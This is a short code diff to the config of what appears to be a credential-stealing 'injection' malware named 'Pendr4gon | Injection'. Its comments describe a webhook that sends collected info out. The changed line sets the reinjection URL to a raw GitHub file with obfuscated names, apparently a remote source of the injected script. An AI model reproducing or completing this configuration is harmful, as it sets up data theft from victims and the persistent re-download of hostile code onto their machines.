@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Pendr4gon | Injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://i.pinimg.com/736x/d4/69/b8/d469b8dfd66b8dadef3be68925711e5b.jpg', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 16711680, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: '', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/ae6f117592b7.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
